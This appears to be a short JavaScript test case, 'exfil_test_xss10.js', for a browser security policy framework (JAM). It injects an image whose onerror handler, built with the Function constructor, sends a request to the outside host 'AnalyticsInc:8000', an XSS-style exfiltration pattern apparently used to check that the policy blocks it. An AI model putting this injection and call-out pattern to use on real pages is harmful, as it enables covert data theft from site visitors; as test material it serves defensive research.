// exfil_test_xss10.js
function exfiltrate_key_history() {
  var URL = JAM.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss10",true);xmlhttp.send(null);']);
  var script = document.createElement("img");
  script.src = "/";
  JAM.set(script, "onerror", URL);
  var v2 = document.getElementsByTagName("body");
  introspect(JAM.policy.p1) {
    var v0 = v2[0]
  }
  JAM.call(v0.appendChild, v0, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

